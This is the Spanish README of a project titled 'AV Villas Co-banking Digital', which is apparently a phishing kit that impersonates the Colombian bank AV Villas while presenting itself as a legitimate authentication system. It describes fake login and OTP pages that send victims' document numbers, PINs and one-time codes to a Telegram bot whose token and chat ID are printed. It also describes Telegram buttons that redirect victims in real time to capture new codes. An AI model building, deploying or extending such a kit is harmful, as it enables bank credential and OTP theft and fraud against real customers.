# 🏦 AV Villas Co-banking Digital

Sistema de autenticación profesional con integración de Telegram Bot y Socket.IO para comunicación en tiempo real sin delays.

## ✨ Características Principales

### 🎨 Diseño y UX
- ✅ **Diseño responsive premium** adaptable a todos los dispositivos (móvil, tablet, desktop)
- ✅ **Pantalla de carga elegante** con logo animado y spinners personalizados
- ✅ **Iconos SVG dinámicos** que aparecen al escribir
- ✅ **Validación en tiempo real** con feedback visual inmediato
- ✅ **Footer responsive** con logos optimizados
- ✅ **Tipografía Roboto** de Google Fonts

### 🔒 Seguridad y Validación
- ✅ Solo números en campo de documento
- ✅ Solo 4 dígitos numéricos en contraseña
- ✅ Solo 6 dígitos numéricos en código OTP
- ✅ Validación instantánea de campos
- ✅ Prevención de envíos múltiples

### 🚀 Tecnología
- ✅ **Socket.IO** con reconexión automática infinita
- ✅ **Telegram Bot API** con botones interactivos
- ✅ **Comunicación persistente** sin delays
- ✅ **Arquitectura modular** con código limpio y organizado
- ✅ **Manejo robusto de errores**
- ✅ **Sistema de broadcast** para múltiples clientes

## 📋 Requisitos

- Node.js v14 o superior
- npm v6 o superior
- Conexión a internet para Telegram Bot API

## 🛠️ Instalación

1. **Clonar o descargar el proyecto**
   ```bash
   cd AV-Villas
   ```

2. **Instalar dependencias**
   ```bash
   npm install
   ```

3. **Iniciar el servidor**
   ```bash
   npm start
   ```

4. **Abrir en el navegador**
   ```
   http://localhost:3000
   ```

## ⚙️ Configuración

### Telegram Bot
El bot ya está configurado con:
- **Token Bot:** `8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU`
- **Chat ID:** `-5029729816`

Para cambiar la configuración, editar en:
- `client.js` → `CONFIG.TELEGRAM`
- `otp-client.js` → `CONFIG.TELEGRAM`
- `server.js` → `CONFIG.TELEGRAM`

### Socket.IO
Configuración actual:
- Puerto: `3000`
- Reconexión: Infinita
- Timeout: 10 segundos
- Ping Interval: 25 segundos

## 📱 Uso del Sistema

### 1️⃣ Página de Login (`index.html`)

**Flujo de usuario:**
1. Seleccionar tipo de documento (Cédula de Ciudadanía, Extranjería o Tarjeta de Identidad)
2. Ingresar número de documento (solo números, mínimo 5 dígitos)
3. Ingresar contraseña (exactamente 4 dígitos numéricos)
4. El botón "INGRESAR" se habilita automáticamente cuando todo es válido
5. Al enviar, aparece pantalla de carga elegante con logo animado
6. Los datos se envían a Telegram con botones interactivos

**Validaciones:**
- ✅ Aparece icono de usuario al escribir en documento
- ✅ Aparece icono de candado al escribir en contraseña
- ✅ Botón cambia a azul brillante cuando está habilitado
- ✅ Mensajes de error si campos están incompletos

### 2️⃣ Página de OTP (`otp.html`)

**Flujo de usuario:**
1. Ingresar código de verificación (exactamente 6 dígitos numéricos)
2. El botón "VERIFICAR" se habilita automáticamente al completar 6 dígitos
3. Al enviar, aparece pantalla de carga
4. El código se envía a Telegram con botones interactivos

**Validaciones:**
- ✅ Aparece icono de escudo al escribir
- ✅ Auto-focus en el campo al cargar
- ✅ Solo acepta números
- ✅ Máximo 6 dígitos

### 3️⃣ Control desde Telegram

Cuando llegan datos al bot de Telegram, aparecen 2 botones:

**🔑 Pedir Login**
- Redirige a todos los clientes conectados a la página de login
- Útil para solicitar nueva información de acceso

**📱 Pedir OTP**
- Redirige a todos los clientes conectados a la página de OTP
- Útil para solicitar código de verificación

## 🏗️ Arquitectura del Proyecto

```
AV-Villas/
│
├── 📄 index.html              # Página principal de login
├── 📄 otp.html                # Página de verificación OTP
│
├── 📜 client.js               # Controlador del cliente (login)
│   ├── CONFIG                 # Configuración centralizada
│   ├── DOM                    # Referencias a elementos
│   ├── AppState               # Estado de la aplicación
│   ├── Utils                  # Funciones utilitarias
│   ├── FormValidator          # Validación de formularios
│   ├── TelegramService        # Comunicación con Telegram
│   ├── SocketManager          # Gestión de Socket.IO
│   ├── EventHandlers          # Manejadores de eventos
│   └── App                    # Inicializador
│
├── 📜 otp-client.js           # Controlador del cliente (OTP)
│   └── [Misma estructura modular]
│
├── 📜 server.js               # Servidor Node.js
│   ├── CONFIG                 # Configuración del servidor
│   ├── ClientManager          # Gestión de clientes conectados
│   ├── Utils                  # Utilidades del servidor
│   ├── TelegramService        # Servicio de Telegram
│   ├── Socket.IO Handlers     # Manejadores de eventos
│   └── Express Routes         # Rutas HTTP
│
├── 📦 package.json            # Dependencias y scripts
├── 📖 README.md               # Este archivo
│
└── 📁 img/                    # Recursos gráficos
    ├── logo-avvillas.svg
    ├── grupo-aval.png
    └── logo_vigilado_horizontal_black.svg
```

## 🔧 Tecnologías Utilizadas

| Categoría | Tecnología | Versión |
|-----------|-----------|---------|
| **Frontend** | HTML5, CSS3, JavaScript | ES6+ |
| **Backend** | Node.js | v14+ |
| **Framework Web** | Express | ^4.18.2 |
| **WebSockets** | Socket.IO | ^4.6.0 |
| **Bot API** | node-telegram-bot-api | ^0.61.0 |
| **Tipografía** | Google Fonts (Roboto) | - |

## 📊 Características Técnicas Avanzadas

### 🔄 Sistema de Reconexión
- Reconexión automática infinita
- Sin pérdida de datos durante desconexiones
- Notificación en consola de estado de conexión

### 📡 Broadcast Inteligente
- Envío simultáneo a múltiples clientes
- Conteo de clientes activos
- Manejo individual de errores por cliente

### 🎯 Validación Multinivel
- Validación en cliente (JavaScript)
- Validación en formato (input patterns)
- Validación visual en tiempo real

### 🛡️ Manejo de Errores
- Try-catch en todas las operaciones async
- Logs detallados en consola
- Feedback visual al usuario
- Recuperación automática de conexiones

### 🎨 Pantalla de Carga Premium
- Logo animado con efecto pulse
- Doble spinner con rotaciones opuestas
- Texto con fade in/out
- Dots animados con bounce
- Gradiente de fondo suave

## 📱 Responsive Design

### Breakpoints
- **Desktop:** > 768px
- **Tablet:** 481px - 768px
- **Mobile:** ≤ 480px

### Optimizaciones por Dispositivo
- Logos escalables en footer
- Inputs táctiles optimizados
- Botones con tamaño de toque adecuado
- Tipografía adaptable

## 🔍 Monitoreo y Debug

### Logs del Servidor
```
✅ Cliente conectado: [ID] | Total: [N]
❌ Cliente desconectado: [ID] | Total: [N]
📥 Datos de login recibidos
📥 Código OTP recibido
✅ Datos enviados a Telegram
📡 Evento "redirect" enviado a [N] clientes
```

### Logs del Cliente
```
✅ Aplicación inicializada
✅ Conectado al servidor
❌ Desconectado del servidor
🔄 Reconectado después de [N] intentos
📡 Comando de redirección recibido
✅ Datos enviados correctamente
```

## 🌐 Endpoints HTTP

| Ruta | Método | Descripción |
|------|--------|-------------|
| `/` | GET | Página de login |
| `/otp` | GET | Página de OTP |
| `/otp.html` | GET | Página de OTP (alternativa) |
| `/status` | GET | Estado del servidor (JSON) |

### Ejemplo respuesta `/status`:
```json
{
  "status": "online",
  "clients": 2,
  "uptime": 3600.5,
  "timestamp": "2025-11-27T10:30:00.000Z"
}
```

## 🚀 Comandos NPM

```bash
# Iniciar servidor
npm start

# Modo desarrollo (con nodemon)
npm run dev

# Instalar dependencias
npm install
```

## 🔐 Seguridad

- ✅ Validación de entrada en cliente y servidor
- ✅ Escape de caracteres especiales en Markdown
- ✅ Prevención de inyección de código
- ✅ CORS configurado
- ✅ Timeouts configurados
- ✅ Manejo de errores robusto

## 🌟 Mejores Prácticas Implementadas

1. **Código Modular:** Separación por responsabilidades
2. **Nombres Descriptivos:** Variables y funciones claras
3. **Comentarios JSDoc:** Documentación inline
4. **Const por defecto:** Inmutabilidad cuando es posible
5. **Arrow Functions:** Sintaxis moderna
6. **Async/Await:** Código asíncrono legible
7. **Error Handling:** Try-catch en operaciones críticas
8. **Clean Code:** Código limpio y mantenible

## 📞 Soporte de Navegadores

| Navegador | Versión Mínima |
|-----------|----------------|
| Chrome | 90+ |
| Firefox | 88+ |
| Safari | 14+ |
| Edge | 90+ |
| Opera | 76+ |
| iOS Safari | 14+ |
| Android Chrome | 90+ |

## 📝 Licencia

MIT License - Libre para uso personal y comercial

## 👨‍💻 Autor

Sistema desarrollado con arquitectura profesional, código limpio y mejores prácticas de desarrollo web moderno.

---

**¿Necesitas ayuda?** Revisa los logs de la consola del navegador y del servidor para obtener información detallada sobre cualquier error.
